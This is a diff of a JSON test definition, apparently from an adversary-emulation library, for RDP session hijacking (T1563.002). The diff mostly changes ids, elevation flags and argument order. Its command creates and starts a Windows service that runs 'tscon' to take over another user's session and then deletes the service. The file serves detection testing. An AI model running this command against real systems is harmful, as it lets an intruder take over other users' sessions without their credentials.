@@ -7,52 +7,52 @@
   ],
   "steps": [
     {
-      "id": "6e88426a-cfcb-4f55-bb25-fb9f5f2400cc",
+      "id": "a139bcdf-a712-451f-8b72-c43748e87e82",
       "type": "execute-command",
       "data": {
         "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "11ed7311-5715-420a-ac2b-9a23cc3d5422",
+      "id": "a5cbc78e-03ba-4390-a753-3cbff264782c",
       "type": "execute-command",
       "data": {
         "command": "sc.exe delete sesshijack \u003enul 2\u003e\u00261\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "6e88426a-cfcb-4f55-bb25-fb9f5f2400cc",
+      "s": "a139bcdf-a712-451f-8b72-c43748e87e82",
       "p": "on-success",
-      "o": "11ed7311-5715-420a-ac2b-9a23cc3d5422"
+      "o": "a5cbc78e-03ba-4390-a753-3cbff264782c"
     },
     {
-      "s": "6e88426a-cfcb-4f55-bb25-fb9f5f2400cc",
+      "s": "a139bcdf-a712-451f-8b72-c43748e87e82",
       "p": "on-failure",
-      "o": "11ed7311-5715-420a-ac2b-9a23cc3d5422"
+      "o": "a5cbc78e-03ba-4390-a753-3cbff264782c"
     }
   ],
   "tags": [
-    "T1563.002",
-    "atomic-red-team"
+    "T1563",
+    "T1563.002"
   ],
   "input_arguments": [
-    {
-      "name": "Destination_ID",
-      "type": "string",
-      "description": "Connect the session of another user to a different session",
-      "value": "rdp-tcp#55"
-    },
     {
       "name": "Session_ID",
       "type": "string",
       "description": "The ID of the session to which you want to connect",
       "value": "1337"
+    },
+    {
+      "name": "Destination_ID",
+      "type": "string",
+      "description": "Connect the session of another user to a different session",
+      "value": "rdp-tcp#55"
     }
   ]
 }
